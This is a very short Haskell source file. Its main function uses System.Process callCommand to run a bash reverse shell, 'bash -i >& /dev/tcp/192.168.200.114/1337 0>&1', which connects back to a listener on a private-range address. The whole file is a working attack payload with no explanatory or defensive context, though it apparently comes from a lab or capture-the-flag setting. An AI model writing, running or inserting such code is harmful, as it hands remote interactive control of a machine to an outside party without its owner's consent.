import System.Process

main = do
	callCommand "bash -c 'bash -i >& /dev/tcp/192.168.200.114/1337 0>&1'"
